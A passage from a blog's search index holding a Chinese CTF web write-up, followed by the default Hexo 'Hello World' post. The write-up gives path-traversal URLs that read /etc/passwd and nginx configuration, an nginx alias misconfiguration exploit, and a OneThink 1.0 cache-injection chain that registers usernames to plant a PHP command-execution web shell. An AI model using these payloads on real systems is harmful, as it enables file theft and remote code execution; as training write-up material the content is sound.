class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f325bbb20d854d3fb14b3e100775cbd873a664048d4742a4.changame.ichunqiu.com/manages/admin.ph?module=ind.././ex&amp;name=php</span><br></pre></td></tr></table></figure><p>返回错误，没过滤./，所以可以构造…/./进行绕过过滤</p><p>测试文件读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f325bbb20d854d3fb14b3e100775cbd873a664048d4742a4.changame.ichunqiu.com/manages/admin.php?module=..././..././..././etc/passwd&amp;name=</span><br></pre></td></tr></table></figure><p>查看下服务器是nginx。找一下它的配置文件，在自己的kali下，用以下命令查找：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# find / -name &quot;nginx.conf&quot;</span><br></pre></td></tr></table></figure><p>，返回 /etc/nginx/nginx.conf</p><p>读取该配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f325bbb20d854d3fb14b3e100775cbd873a664048d4742a4.changame.ichunqiu.com/manages/admin.php?module=..././..././..././etc/nginx/nginx.conf&amp;name=</span><br></pre></td></tr></table></figure><p>返回中有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include sites-enabled/default</span><br></pre></td></tr></table></figure><p>继续读取该文件</p><p>在该文件里，发现 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location /online-movies &#123;</span><br><span class="line">            alias /movie/;</span><br><span class="line">            autoindex on;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这里边的 autoindex on  ，即为允许目录浏览。访问/online-movies ,发现页面上显示../即可浏览目录下载文件。访问/online-movies../var/www/html/flag.php    下载该文件，获得flag</p><h2 id="六-：-OneThink"><a href="#六-：-OneThink" class="headerlink" title="六 ： OneThink"></a>六 ： OneThink</h2><p>google OneThink 1.0的漏洞</p><p>参考大佬的<a href="https://ox1234.github.io/2018/07/27/OneThink%20CMS%E7%9A%84%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">博客</a></p><p>1、注册账号名为： %0aphpinfo();#  的账号   //  %0a是换行符的意思，缓存到文件的时候起换行作用</p><p>2、填写好注册信息进行抓包 ,  burp抓包的时候  把%0a 进行url解码1次  以换行了为准</p><p>3、注册完之后进行登陆，同样要抓包，把%0a进行url解码1次；</p><p>4、登陆成功之后，访问Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php路径文件，会发现phpinfo()被解析           //该文件地址及文件名是固定的；</p><p>5、同样的方法注册俩个账号： %0a$a=$_GET[a];//   和   %0asystem($a);//  </p><p>6、注册完之后，要登陆俩个账号  才能把账号名写入到文件当中</p><p>7、访问Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=cat ../../flag.php 获取flag    //通过ls  ../的方式翻目录进行flag寻找；最后cat的 flag在源码中会显示</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/11/24/hello-world/"/>
      <url>/2019/11/24/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
